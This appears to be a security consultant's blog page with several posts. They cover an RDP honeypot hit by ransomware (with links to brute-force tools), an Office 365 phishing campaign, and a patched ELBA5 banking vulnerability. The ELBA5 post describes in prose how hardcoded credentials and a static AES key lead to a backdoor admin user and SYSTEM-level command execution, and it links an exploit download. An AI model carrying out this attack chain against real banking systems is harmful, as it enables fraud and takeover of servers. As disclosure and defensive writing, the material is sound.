Mit [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) protokollieren wir alle Prozessstarts, Datei- und Registryänderungen aber auch jeglichen Netzwerkverkehr. Der [Blackcat Keylogger](https://0x00sec.org/t/blackcat-keylogger/10307) zeichnet zusätzliche alle Tastatureingaben auf. Da viele Cyberangriffe auf Powershell aufbauen, [werden diese Befehle auch geloggt](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html). Damit wir sofort bescheid wissen, sobald unser Honeypot attackiert wird, haben wir unser Microsoft Teams integriert, wodurch [Live Notifications](https://docs.microsoft.com/en-us/microsoftteams/platform/webhooks-and-connectors/how-to/connectors-using#setting-up-a-custom-incoming-webhook) möglich werden. Um das Vorgehen der Kriminellen besser zu verstehen, haben wir an unterschiedlichen Stellen im Dateisystem auch Fake Inhalte platziert. Alle Aktivitäten der RDP Sitzung werden mit [FFmpeg](https://www.ffmpeg.org/) auch als Video aufgezeichnet. Und genau darum geht es in diesem Blogeintrag!

Im Folgenden finden Sie ein Video, das die Verschlüsselung unseres Honeypots und das Vorgehen der Kriminellen im Detail zeigt. Besonders spannend daran ist jedoch, dass zuvor der komplette Rechner analysiert und auch Lateral Movement versucht wird. Also gleich ansehen:

Bei der vom Angreifer verwendeten Cryptolocker Schadsoftware handelt es sich übrigens um Standardkomponenten: CrySIS. Diese wird sehr oft in der von uns beobachteten Form per RDP Bruteforcing in Unternehmensnetzwerke eingeschleust. Siehe dazu auch das wirklich gelungene [Threat Spotlight von Malwarebytes](https://blog.malwarebytes.com/threat-analysis/2019/05/threat-spotlight-crysis-aka-dharma-ransomware-causing-a-crisis-for-businesses/).

Das hier eingesetzte Sample war übrigens schon von praktisch allen Virenscannern als bösartig eingestuft. Da die Infektionen aber manuell stattfindet, werden die installierten Virenscanner einfach deaktiviert.

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-02-13-at-13.17.44.png)

In unserem Fall wäre ein Zahlung von 3.000€ von den Angreifern gefordert worden. Leider kann man sich jedoch oft nicht auf die Aussagen der Kriminellen verlassen. Wird die initiale Forderung beglichen, kann es passieren, dass das Lösegeld noch einmal erhöht wird:

![](https://bogner.sh/wp-content/uploads/2020/04/Untitled.png)
## Wie bricht man in RDP Server ein?

Um überhaupt in unseren Honeypot einzubrechen, kann beispielsweise Masscan und RDP Brute verwendet werden. Im ersten Schritt werden dabei mittels der in [Masscan](http://toolshacke.blogspot.com/2016/12/masscan-gui-windows.html) hinterlegten Länder IP Ranges öffentlich erreichbare RDP Server gesucht. Der eigentliche Einbruchsversuch kann anschließend mit [RDP Brute](https://hack-nesia.blogspot.com/2016/07/rdp-brute-coded-by-z668.html) oder NL Brute durchgeführt werden. Beide Tools ermöglichen Wörterbuchangriffe auf schwache Benutzerpasswörter:

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-04-05-at-20.02.05.png)

Viele der so gekaperten Rechner werden nicht nur verschlüsselt, sondern auch auf Plattformen wie dedic.top für wenig Geld weiterverkauft. Als Käufer kann man hier komfortabel auf den Serverstandort, Admin Rechte und “Entdeckungsrisiko” filtern. Sollte der so gekaufte “Dedic” vom eigentlichen Besitzer gesperrt worden sein, gibt es natürlich kostenlos Ersatz.

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-04-05-at-20.18.55.png)
## Wie kann ich mich schützen?

IT Security muss nicht immer teuer sein! Ganz im Gegenteil, ein guter Basisschutz reicht in vielen Fällen bereits aus, um Cyberangriffe zu verhindern – so auch hier.

### **RDP nicht direkt im Internet publizieren & Multi-Faktor Authentifizierung**

Es sollte immer ein Remote Desktop Gateway verwendet werden, der zusätzliche Sicherheitsfunktionen bereitstellt. Besonders wichtig ist hier der zweite Authentifizierungsfaktor z.B. per Smartphone-App für Remotezugriffe.

### **Verwenden Sie Lockout Policies**

Unser Honeypot wird primär durch Wörterbuchangriffe übernommen. Leider mussten wir auch bereits einige echte Incidents nach Einbrüchen über RDP bearbeiten. Durch die Nutzung einer Lockout Policy hätten viele verhindert werden können.

### **Mitarbeiter Awareness**

Alleine durch Technik ist es nicht möglich die eigene Organisation ausreichend zu schützen! Entscheidend ist die Mitarbeiter auf die Bedrohungen durch Cyberkriminalität zu schulen. Wir können hier unseren Partner [nextbeststep](https://www.nextbeststep.at/) nur wärmstens empfehlen!

### **IT Systeme härten** (“Hacking Workshops”)

Es gibt noch viele weitere einfache Tricks, wie das eigene Netzwerk noch besser gegen Angriffe abgesichert werden kann. Dies lassen sich am Besten im Zuge von “Hacking Workshops” vermitteln. In unseren geführten Security Audits hacken wir gemeinsam mit Ihrer IT Abteilung die eigene Infrastruktur und erarbeiten anschließend gemeinsam entsprechende Absicherungsmaßnahmen. Dieses Vorgehen bringt einen langfristigen IT Security Mehrwert in der IT Abteilung und hilft sofort wichtige Absicherungsmaßnahmen umzusetzen. Das besondere: Wir helfen gleich bei der Implementierung mit – das ganze ohne eigenes Produkt-Portfolio.

Bei Fragen zu diesem Artikel oder unseren Hacking Workshops, senden Sie mir am Besten eine Mail an: florian [@] bee-itsecurity.at

 Posted by [florian](https://bogner.sh/author/florian/) at 00:30

## [Phishing auf der Schulter von Riesen](https://bogner.sh/2020/01/phishing-auf-der-schulter-von-riesen/ "Phishing auf der Schulter von Riesen")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2020/01/phishing-auf-der-schulter-von-riesen/#respond)

Jan 082020

Aktuell gibt es im deutschsprachigen Raum eine neue Phishing Welle, die es vor allem auf Office 365 Konten absieht. Das besondere daran: die Office 365 Infrastruktur ist selbst Teil der Attacke.

Leider erscheint die neue Taktik aber auch sehr gut zu funktionieren. Wir haben mittlerweile mehrere Kunden die mit entsprechend kompromittierten Konten konfrontiert sind. Über das Microsoft 365 Admin Center und den [Audit Log Search](https://protection.office.com/unifiedauditlog) ist es im Fall der Fälle aber relativ gut möglich die Größe der Infektion zu erkennen und entsprechende Gegenmaßnahmen (Passwort Resets; Meldung bei DSB) einzuleiten.

Aber zurück zur eigentlichen Attacke. Im Folgenden werden wir ein anonymisiertes Beispiel verwenden, um die verschiedenen Teilschritte zu analysieren.

## Das Phishing Mail

Als Eintrittspunkt in die Organisation werden meist legitim aussehende Phishing Mails, wie das Folgende eingesetzt. Das gemeine daran: Beim Absender handelt es sich um ein echte Firma, der richtigen Firmendomäne und der passenden Signatur. Nur der Inhalt der Nachricht könnte zum Nachdenken anregen.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.13.57.png)
## Die Landing Page

Aber hier kommt schon der nächste Trick der Angreifer: der eingebettete Link zeigt auf einen bereits vorab gekaperten Account auf Office 365. In diesem Fall auf eine OneNote Notiz. Dies erschwert es einerseits den technischen Schutzmaßnahmen, da die Microsoft Domänen ein hohes Vertrauen genießen. Andererseits kennen auch die Anwender Microsoft als “sicheres” Unternehmen.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.17.47.png)

Neben OneNote werden aber auch noch andere Produkte, wie beispielsweise Sway von den Angreifern eingesetzt:

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.42.17.png)

Das heißt, die Kriminellen missbrauchen das komplette Office 365 Portfolio. Das Schema ist aber immer das gleiche: das potentielle Opfer soll einem Link auf eine Drittseite folgen.

*Besonders perfide: Kann der eigene Account gekapert werden, wird auch dieser in Phishing Angriffen eingesetzt!*

## Die eigentliche Phishing Seite

Klickt der Endanwender tatsächlich auf den Link, landet er/sie auf der eigentlichen Phishing Seite. Hier sind die Angreifer nicht wählerisch und bieten viele verschiedene “Anmeldeverfahren” an. Der Benutzer kann selbst auswählen welche Zugangsdaten er/sie preisgeben möchte.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.18.07.png)

Wird beispielsweise Office 365 selektiert, erscheint eine der echten Microsoft Loginseite nachempfundene Anmeldemaske.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.18.12.png)
## Das Finale

Gibt der Anwender seine Daten ein, wird eine x-beliebige PDF Datei angezeigt. Dieses Vorgehen deckt sich mit unseren Red-Teaming / Friendly Phishing Erfahrungen: es ist wichtig dem Benutzer Feedback zu geben. Selbst wenn es sich dabei um sinnlose Informationen handelt, reicht dies aus, damit die IT Abteilung NICHT über einen möglichen Fehler informiert wird. Die Attacke bleibt dadurch unentdeckt.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.52.15.png)
## Die Analyse

Da leider bereits einige unserer Kunden Opfer der hier beschriebenen Attacke wurden, konnten wir das Vorgehen mehrfach analysieren. Das folgenden Bild illustriert die wichtigsten Abläufe (natürlich anonymisiert):

![](https://bogner.sh/wp-content/uploads/2020/01/IMG_1531.jpg)

Bei allen gekaperten Mailboxen konnten wir nach der initialen Kompromittierung mehrere unautorisierte Zugriffe durch die Angreifer feststellen. U.a. wird dabei auch das IMAP Protokoll eingesetzt. Es ist also davon auszugehen, dass Daten exfiltiert wurden.

Nach Tagen, teilweise sogar Wochen, wird dann das eigene Konto verwendet um selbst Spam Nachrichten an alle Kontakte zu versenden. Dabei wird die versendete Phishing Nachricht auch an den jeweiligen Absender angepasst. Beispielsweise wird die Signatur übernommen und auch der Firmenname in den Phishing Seiten eingebaut. Damit der gerade stattfindenden Spam Versand nicht durch Fehlermeldungen vom Benutzer entlarvt werden kann, werden u.a. Outlook Regeln eingesetzt, die eingehende Nachrichten automatisiert löschen.

All diese Maßnahmen machen die Fake-Mails viel erfolgreicher und erschweren die Erkennung erheblich. Phishing auf den Schultern von Riesen!

Sollten Sie selbst Opfer einer Cyber Attacke geworden sein, stehen wir mit unserem Know How hilfreich zur Seite.

Egal ob Phishing, Cryptolocker oder Datendiebstahl. Wir können helfen: [Bee IT Security](https://www.bee-itsecurity.at)!

![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)

 Posted by [florian](https://bogner.sh/author/florian/) at 17:25

## [Alternative Methode zur Priorisierung von Informations-Sicherheitsmaßnahmen [German]](https://bogner.sh/2019/04/alternative-methode-zur-priorisierung-von-informations-sicherheitsmasnahmen-german/ "Alternative Methode zur Priorisierung von Informations-Sicherheitsmaßnahmen [German]")

 [Security](https://bogner.sh/category/security/)
 [1 Response »](https://bogner.sh/2019/04/alternative-methode-zur-priorisierung-von-informations-sicherheitsmasnahmen-german/#comments)

Apr 022019

Nachhaltigkeit ist eines der zentralsten Schlagworte in der klassischen IT. Egal ob Server, Storage oder Softwarelizenz, Komponenten sollen einerseits über viele Jahre, mit einem genau bekannten Budget nutzbar und andererseits richtig dimensioniert sein. Nicht zu klein – um frühzeitige Upgrades zu vermeiden – und nicht zu groß – damit es keine ungenutzten Ressourcen gibt.

Laut meinen Beobachtungen trifft diese genaue Planung interessanterweise jedoch nicht immer auf die Entscheidungen zum Thema IT Security zu. Hier werden, „um das eigene Risiko zu senken“, Produkte und Lösungen im fünf und sogar sechsstelligen Bereich ohne zu zögern eingekauft. Obwohl all diese Technologien und Services ihre Berechtigung haben, stellt sich immer die Frage: Ist dieser Schritt der Richtige – **für meinen aktuellen Security Level?** Und die Antwort auf diese Frage ist leider sehr oft: Nein!

Beispielsweise macht es so keinen Sinn über die Anschaffung eines SOC-as-a-Service nachzudenken, solange nicht Basis-Schutzmechanismen wie Festplattenverschlüsselung, Randomisierung der lokalen Admin-Passwörter oder Mail & Webfilter implementiert sind.

Die in diesem Post aufbereiteten Informationen bauen primär auf meine Erfahrungen aus der Tätigkeit bei [Bee IT Security](https://www.bee-itsecurity.at) auf. Unser Ziel ist hier, Unternehmen durch unabhängige Beratung mit solider IT Security auszustatten.

[![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)](https://www.bee-itsecurity.at)

Gemeinsam mit unserem Partner [nextbeststep](https://www.nextbeststep.at) – dem Spezialisten zum Thema IT Security Awareness in Österreich – wurde nun eine entsprechende Klassifizierung und Bewertung von Maßnahmen für IT Sicherheitsverantwortliche und CISOs erstellt. Danke auch auf diesem Wege noch einmal für die tolle Zusammenarbeit.

![](https://bogner.sh/wp-content/uploads/2019/03/awareness-abo-hero-home.jpg)

Als Ergebnis ist ein Security Katalog mit mehr als 50 Empfehlungen entstanden. All diese wurden zu ihren Kosten, ihrer Durchführungskomplexität und ihrer Wirksamkeit bewertet. **Mit nur einem Blick können Sie so “Quick Wins”für die eigene Infrastruktur identifizieren oder geplante Security Maßnahmen bewerten.** Und das komplett kostenlos.

![](https://bogner.sh/wp-content/uploads/2018/12/screen.png)

Als besonderer Faktor wurde im Übrigen auch die Transparenz für Endbenutzer miteinbezogen. Diese wird leider oft vernachlässigt, ist aber entscheidend für den Erfolg eines jeden IT Security Programms. Werden innerhalb kurzer Zeit zu viele Maßnahmen umgesetzt, die negative Folgen auf den Arbeitsablauf der Mitarbeiter haben, entstehen Spannungen und Frust. Dies kann durch den richtigen “Mix” von vornherein vermieden werden.

Das Excel Dokument können Sie hier herunterladen:

[![](https://bogner.sh/wp-content/uploads/2019/03/Screenshot-2019-03-31-at-11.18.00.png)](https://bogner.sh/wp-content/uploads/2019/04/Priorisierung-von-Info-Sec-Ma%C3%9Fnahmen-v1.9.xlsx)

Im Folgenden finden Sie noch zwei Beispiele, wie das Dokument effizient eingesetzt werden kann.

## Erarbeiten eines Maßnahmenplans

Um einen Maßnahmenplan zu erarbeiten eignet sich die Liste besonders gut. Dazu ist es nämlich nur notwendig, die Zeilen in aufsteigender Reihenfolge für die Spalte “Differenz Umsetzbarkeit – Wirksamkeit (je niedriger umso besser)” zu sortieren. Mit Excel ist das über die Sort Funktion im Ribbon Data einfach möglich.

![](https://bogner.sh/wp-content/uploads/2018/12/Screenshot-2018-12-31-at-14.57.46.png)

Je weiter oben eine Maßnahme nun gelistet wird, umso besser ist einerseits der Kosten/Nutzen Faktor. Des Weiteren sind auch keine Einschränkungen für Endanwender zu erwarten.

Als eine der wichtigsten Maßnahmen wird nun beispielsweise die “Inventur der von extern erreichbaren Dienste” aufgeführt. Wie in der Spalte “Beschreibung” dokumentiert, sollten regelmäßig die über das Internet erreichbaren Dienste und Anwendungen überprüft werden. Erfahrungsgemäß können vor allem alte bzw. vergessene (Web)-Anwendungen missbraucht werden um Zugriff auf das interne Firmennetzwerk zu erhalten. Dementsprechend müssen diese einerseits erkannt und in weiterer Folge deaktiviert werden.

Es empfiehlt sich also das Excel Dokument mit den bereits in der eigenen Infrastruktur umgesetzten Maßnahmen abzugleichen und fehlende Empfehlungen zeitnah umzusetzen. Sie werden überrascht sein, wie viele davon kostengünstig implementiert werden können!

## Priorisierung von Maßnahmen

Das Dokument bzw. die hinterlegten Formeln, können natürlich auch für die Priorisierung von eigenen Maßnahmen verwendet werden. Dazu können Sie einfach selbst neue Zeile hinzufügen.

Wie der folgende Screenshot zeigt, kann so beispielsweise der Mehrwert für das Unternehmen durch die Anschaffung einer Next Generation Endpoint Lösung gegenüber einer AI basierenden Firewall verglichen werden. Dabei ist klar, dass in diesem Fall der Next Generation Endpoint gewählt werden sollte.

![](https://bogner.sh/wp-content/uploads/2018/12/Screenshot-2018-12-31-at-15.49.00.png)

Wenn Sie das Dokument selbst erweitern, würden wir uns über Zusendung dieser Daten freuen. In regelmäßigen Abständen kann die Maßnahmensammlung so erweitert und wieder der Allgemeinheit bereitgestellt werden.

**Natürlich unterstützen wir als Bee IT Security auch Sie gerne bei der Planung ihrer IT Security Strategie. Mehr dazu unter** [**https://bee-itsecurity.at.**](https://bee-itsecurity.at)

 Posted by [florian](https://bogner.sh/author/florian/) at 04:28

## [0-Day in ELBA5’s Network Installation: Overtaking your company’s bank account](https://bogner.sh/2018/11/0-day-in-elba5s-network-installation-overtaking-your-companys-bank-account/ "0-Day in ELBA5’s Network Installation: Overtaking your company’s bank account")

 [Network](https://bogner.sh/category/network/), [Security](https://bogner.sh/category/security/), [Software](https://bogner.sh/category/software/), [Windows](https://bogner.sh/category/windows/)
 [2 Responses »](https://bogner.sh/2018/11/0-day-in-elba5s-network-installation-overtaking-your-companys-bank-account/#comments)

Nov 162018

This blog post is about a previously unknown critical vulnerability in the [Austrian](https://en.wikipedia.org/wiki/Austria) electronic banking application [ELBA5](https://www.elba.at/). The issue discussed here could be abused to gain full control over any ELBA5 database server as well as the underlying operating system. It has a confirmed [CVSSv3 score of 10.0](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H).

**TL;DR: To secure your ELBA5 network installation, please update to the latest available ELBA5 release (5.8.1). For further information please see <https://www.elba.at>**
# What is ELBA5?

ELBA5, as shown below, is one of Austria’s most important business-focused electronic banking applications. It is used by the finance departments of many large organisations and supports about 24 different [banks.](https://www.elba.at/eBusiness/01_template1/1206507788612244132-1206515595789049657-1206515595789049657-NA-38-NA.html)

[![](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.13.13.png)](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.13.13.png)

It is important to note that there are two distinct ELBA5 releases, namely: ELBA5 single-seat and ELBA5 multi-user (aka network installation). The vulnerability discussed here is only exploitable for the ELBA5 network installation. However, I have also reported several other, although less critical issues for the single-seat release. So it’s highly recommended to updated to the latest version anyway.

To give you a broad understanding of how the ELBA5 software stack works in a multi-user configuration, I create the following diagram. On the left side there is the ELBA5 server: This machine has two distinct functions: On the one hand it serves the ELBA5 binary application to all clients using a standard Windows file share. On the other hand it provides the ELBA5 backend, which is basically a [SAP SQL Anywhere Database](https://www.sap.com/products/sql-anywhere.html).

The enduser systems simply connect to the mentioned file share and launch the ELBA5 client from there. This makes it easy to update the application, as there is only a single package that is used by everyone. All the data that is viewed, modified or created from within the ELBA5 client is directly stored into the backend database. This is everything you need to know in order to understand the following exploit…

[![](https://bogner.sh/wp-content/uploads/2018/10/Wenn-ein-CVSS-Score-von-10.0-ein-leeres-Bankkonto-bedeuten-kann-v0.5.jpg)](https://bogner.sh/wp-content/uploads/2018/10/Wenn-ein-CVSS-Score-von-10.0-ein-leeres-Bankkonto-bedeuten-kann-v0.5.jpg)

# How everything started

The story of this vulnerability began during a penetration test last year. There I was able to gain access to the finance department’s terminal server. Amongst other’s they also used the ELBA5 network installation for their daily business. As I’m curious by nature I immediately launched all the interesting looking applications. Below is an image illustrating the sequence of things that happened right after. Can you spot the (possible) issue?

[![](https://bogner.sh/wp-content/uploads/2018/10/Slide2.jpeg)](https://bogner.sh/wp-content/uploads/2018/10/Slide2.jpeg)

Well, here is the thing that caused my attention: How is it possible to install automatic updates without any previous authentication? Is the ELBA5 application using hardcoded credentials to connect to the backend service?

# Initial Analysis

With this initial discovery I started to dig a little deeper. As ELBA5 is developed in Java I used the [CRF](http://www.benf.org/other/cfr/) decompiler to learn more about the inner workings of the application. Strangely, I could not really find any code that established the connection with the database backend. At that point I got really interested…

As my first try failed, I switched to a more brute force-like method: As I guessed that the ELBA5 client uses hardcoded credentials, they have to be somewhere in memory. A quick search for strings like user, uid, password, pwd however did not reveal anything interesting. Hence I thought, these credentials may get cleaned up immediately after establishing the initial connection. This is where the brute force part comes into play: I downloaded Microsoft’s [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) and took memory dumps as fast as I could while launching ELBA5. As shown in the screenshot below, this worked out. I was able to capture the credentials of not one, but two valid backend users. Namely, “connector” and “elba”:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.17.40.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.17.40.png)

By setting up a second ELBA5 network installation, I verified that the connector user always uses the same static password, whereas the elba user’s password did not work there. This was a problem as only the elba user holds administrative DBA privileges. Based on what I had learned already I came up with the assumption that there has to be a two step process for authentication:

#

# The 1 Million Dollar Question: How is this working in Detail?

After taking a closer look at the privileges of the “connector” user on my debug machine (where I knew the DBA password), I discovered that this account is only authorised for a single column in a single table. Well, now I knew where the encrypted DBA password was stored. That it is encrypted (or at least obfuscated) was clear after I compared the content of the daten column with my known elba password. They were completely different.

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.31.42.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.31.42.png)

So, I again had to take a closer look at the source code of the application. Finally, after many hours of debugging I discovered an interesting comment:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.34.55.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.34.55.png)

Has the database logic been “outsourced” into a separate library? To get a first glance I extracted all the strings from the systemtools.dll library… Some stood out immediately:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.39.11.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.39.11.png)The highlighted SQL commands in the above screenshot are likely used to decrypt the secret elba DBA database password. Presumedly the AES encryption algorithm was used to secure the password. From the static strings alone however, I was not able to exfiltrate the required password. So I had to switch to something more dynamic: [Immunity Debugger](https://www.immunityinc.com/products/debugger/).

After setting an access breakpoint on the memory addresses of the above strings (and a few hours of debugging), I found the following information on the stack. The highlighted part contains the hardcoded key that is used to decrypt the elba user’s password.

[![](https://bogner.sh/wp-content/uploads/2018/10/Untitled.png)](https://bogner.sh/wp-content/uploads/2018/10/Untitled.png)

# Bringing it all together

By combining what I had learned by now, it was possible to reliably gain DBA permissions for every single ELBA5 network installation:

1. Connect to the database with the hardcoded “connector” user and SELECT the AES encrypted DBA’s user password
2. Decrypt the password with the static AES key, as obtained with the help of Immunity Debugger
3. Connect to the database with the user elba and the decrypted password. We now have full control over all information that is stored in the DB.

However, this was where the real fun began…

# Adding a Backdoor User

As I was targeting a banking application I thought it would be great to earn a bit of extra cash. So, what about adding a backdoor user?

After again analysing the source code I found out how the user’s password is stored in the table “BEDIENER”:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-13.00.34.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-13.00.34.png)

By analysing all the involved methods, I was able to make it more readable as:

[![](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-10-12-at-11.10.551.png)](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-10-12-at-11.10.551.png)

This finally made it possible to remotely add arbitrary users to the ELBA5 installation. Logically with admin permissions:

[![](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.25.13.png)](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.25.13.png)

*Because everyone wants to have a user called “HACKER” in this electronic backing application – Right?*

# Remote Code Execution

But wait, there is more. Because from a pentester’s point of view we care more about overtaking a server than stealing money…. Luckily there is an old friend in the ELBA5 SQL Anywhere database server that we can use: [xp\_cmdshell](http://dcx.sybase.com/1200/en/dbreference/xp-cmdshell-sysproc.html). This SQL command can be used to run arbitrary applications on the operating system level. What makes this even more interesting was, that the database runs with full SYSTEM level permissions:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-11.20.19.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-11.20.19.png)

That means, we can also add a new Windows Admin. This give us full control over the affected server. [Mimikatz](https://github.com/gentilkiwi/mimikatz) anyone?

# PoC Exploit

To automate the process discussed in this blog post, I wrote a fully fledge python exploit. It can either be used to add a new ELBA5 user to the database or remotely run a command with SYSTEM permissions on the target system. The only thing that is required is that the ELBA5 SQL Anywhere Database service is running a vulnerable version and is accessible over the network (TCP port 2640).

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-12.16.46.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-12.16.46.png)

You can download the full exploit here:

[![](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.34.06.png)](https://bogner.sh/wp-content/uploads/2018/11/elba5_exploit.py_.zip)

# Coordinate Public Disclosure Process

I also want to briefly discuss the coordinated public disclosure process that I went through with the developers of ELBA5. The initial issue was reported last year and triaged within days. As some may have already guessed, this is more an architectural issue and so it required intense rewrites and testing. I was invited twice during this process to discuss the current state. We openly talked about the risks and how they can be mitigated.

I really want to everyone involved for how professionally this matter was resolved. Not many companies take IT security that serious. It really shows how they values their partners and endusers. **THANK YOU!**

# Mitigation

This coordinated process is also important for endusers. Why? Well, because the only thing they have to do is: Please install the lastest ELBA5 5.8.1 release from <https://www.elba.at>. A lot of testing went into making the transition to the new authentication module completely transparent.

# Summary

As I always think it is important to summaries the key aspect, I created the following overview. It gives a great high level introduction into the underlying vulnerability and the suggested solution. This slide is also available in [German](https://bogner.sh/wp-content/uploads/2018/11/ELBA5_RCE_de.png).

[![](https://bogner.sh/wp-content/uploads/2018/11/ELBA5_RCE_en.png)](https://bogner.sh/wp-content/uploads/2018/11/ELBA5_RCE_en.png)

If you have any questions, please contact me directly at florian@bee-itsecurity.at or use the comment form below.

Thanks for reading that far 😉

 Posted by [florian](https://bogner.sh/author/florian/) at 07:01

## [Exploit Development for Dummies [Video]](https://bogner.sh/2018/09/exploit-development-for-dummies-video/ "Exploit Development for Dummies [Video]")

 [Security](https://bogner.sh/category/security/), [Software](https://bogner.sh/category/software/), [Windows](https://bogner.sh/category/windows/)
 [1 Response »](https://bogner.sh/2018/09/exploit-development-for-dummies-video/#comments)

Sep 242018

Have you ever asked yourself how vulnerabilities are discovered and how exploits are written? Well, then this is the perfect video for you. We will start by discussing how so called Fuzzers can be used to find previously unknown bugs in applications. Then we will analyse the generated crash dumps to find out if the underlying issue is exploitable and finally, we will write a fully-fledged exploit.

All this will be demonstrated “live”, based on the example of a well-known application with more than 1 million downloads per month. This is your chance to be part of the disclosure of a previously unknown zero-day vulnerability!

If you have any questions or feedback leave a comment below!

 Posted by [florian](https://bogner.sh/author/florian/) at 06:17

## [Malware Analyse für Anfägner [German only]](https://bogner.sh/2018/09/malware-analyse-fur-anfagner-german-only/ "Malware Analyse für Anfägner [German only]")

 [Network](https://bogner.sh/category/network/), [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2018/09/malware-analyse-fur-anfagner-german-only/#respond)

Sep 062018

Für die meisten Unternehmen ist es undenkbar selbst “Malware Analyse” zu betreiben. Dennoch reichen oft schon wenige Tricks um relevante Eigenschaften einer Malware (sogenannte [IOCs](https://www.sans.org/reading-room/whitepapers/forensics/ioc-indicators-compromise-malware-forensics-34200)) zu finden. Über diese IP Adressen, Hostnamen, Dateien oder Registry Keys kann anschließend abgeleitet werden, ob und welche Endgeräte im eigenen Netzwerk infiziert wurden.

Im folgenden Video stelle ich einige Methoden und Tools vor, wie auch Sie einfache Analysen selbst vornehmen können und so die Sicherheit in Ihrem Unternehmen mit eigener “Threat Intelligence” erhöhen.

Hier noch eine Liste mit Link zu den im Video genutzten Tools:

* [oledump](https://blog.didierstevens.com/programs/oledump-py/) – Analysiert Office Dateien auf gefährliche Inhalte
* [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) – Protokolliert die Systemaktivität
* [Process Hacker](https://processhacker.sourceforge.io/) – Task Manager On Steroids
* [Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) – Welche Anwendungen werden beim Systemstart geladen?
* [HashMyFiles](https://www.nirsoft.net/utils/hash_my_files.html) – Berechnet den MD5 und SHA1 Hash für eine Datei

 Posted by [florian](https://bogner.sh/author/florian/) at 18:40

[Older Entries](https://bogner.sh/category/security/page/2/)

### Search

### Pages

* [About Me](https://bogner.sh/about-me/)
  + [Curriculum Vitae](https://bogner.sh/wp-content/uploads/2017/11/Florian-Bogner-CV-20171126-NP.pdf#new_tab)
  + [LinkedIn Profile](https://www.linkedin.com/profile/view?id=368904276#new_tab)
  + [XING Profile](https://www.xing.com/profile/Florian_Bogner9#new_tab)
* [Donate](https://bogner.sh/donate1/)
* [Privacy Policy](https://bogner.sh/privacy-policy/)
* [Projects](https://bogner.sh/projects/)
* [References](https://bogner.sh/references/)
### Categories

* [Hardware](https://bogner.sh/category/hardware/) (4)
* [Linux](https://bogner.sh/category/linux/) (10)
* [Mac OS X](https://bogner.sh/category/mac-os-x/) (41)
* [Network](https://bogner.sh/category/network/) (6)
* [Security](https://bogner.sh/category/security/) (39)
* [Software](https://bogner.sh/category/software/) (34)
* [Tipps](https://bogner.sh/category/tipps/) (60)
* [Tools](https://bogner.sh/category/tools/) (21)
* [UAC Technikum Vienna](https://bogner.sh/category/uac-technikum-vienna/) (2)
* [Uncategorized](https://bogner.sh/category/uncategorized/) (18)
* [Web Security](https://bogner.sh/category/web-security/) (2)
* [Windows](https://bogner.sh/category/windows/) (27)

### Recent Posts

* [G DATA Anti-Virus: Abusing OpenSSL to get local admin](https://bogner.sh/2021/10/g-data-anti-virus-abusing-openssl-to-get-local-admin/)
* [CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/)
* [TeslaRVNG2 meets HAFNIUM Exchange Exploit](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/)
* [Dirty Offline Bulk IP Geolocation](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/)
* [Egregor Post-Incident Monitor / Protector Script](https://bogner.sh/2020/12/egregor-post-incident-monitor-protector-script/)
### Meta

* [Log in](https://bogner.sh/wp-login.php)
* [Entries feed](https://bogner.sh/feed/)
* [Comments feed](https://bogner.sh/comments/feed/)
* [WordPress.org](https://wordpress.org/)

